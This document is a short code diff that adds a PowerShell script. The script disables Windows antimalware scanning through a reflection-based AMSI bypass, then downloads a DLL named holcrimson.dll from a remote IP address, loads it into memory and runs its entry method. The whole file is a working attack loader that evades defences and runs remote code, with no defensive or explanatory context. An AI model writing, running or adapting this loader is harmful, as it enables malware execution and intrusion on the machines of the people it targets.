@@ -1,0 +1,8 @@
+$a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Failed") {$f = $e}};$f.SetValue($null,$true)
+
+$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.0.178/holcrimson.dll')
+$assem = [System.Reflection.Assembly]::Load($data)
+
+$class = $assem.GetType("holcrimson.Program")
+$method = $class.GetMethod("Run")
+$method.Invoke(0, $null)
